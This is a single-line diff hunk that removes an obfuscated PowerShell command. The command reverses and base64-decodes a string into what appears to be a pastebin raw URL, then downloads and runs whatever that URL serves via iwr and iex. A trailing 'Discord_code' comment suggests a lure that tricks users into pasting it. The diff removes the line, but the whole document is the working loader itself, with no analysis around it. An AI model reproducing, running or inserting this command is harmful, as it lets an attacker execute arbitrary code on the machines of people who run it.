@@ -1,1 +1,0 @@
-powershell -NoExit -Command "$r='KdDWKdUM2MzL3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';$u=($r[-1..-($r.Length)]-join '');$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));iex (iwr -Uri $url)" #Discord_code=9842741949224
